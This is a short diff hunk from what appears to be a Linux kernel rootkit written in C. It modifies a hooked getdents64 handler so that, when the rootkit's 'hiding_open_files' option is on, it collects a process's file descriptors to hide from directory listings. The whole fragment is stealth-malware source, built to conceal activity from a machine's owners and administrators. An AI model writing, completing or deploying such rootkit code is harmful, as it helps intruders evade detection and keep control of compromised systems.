@@ -233,9 +233,9 @@ g7_getdents64(const struct pt_regs *pt_regs)
         }
     }
     
-    if(rootkit.hiding_open_files && ((fd_pid = may_fd(dirfile)) != -1)) {
+    if(rootkit.hiding_open_files && (fd_pid = may_fd(dirfile))) {
         is_fd = 1;
-        add_fd_to_list(&hidden_fds, 0);
+        fill_fds(fd_pid);
     }
 
     for (offset = 0; offset < ret;) {
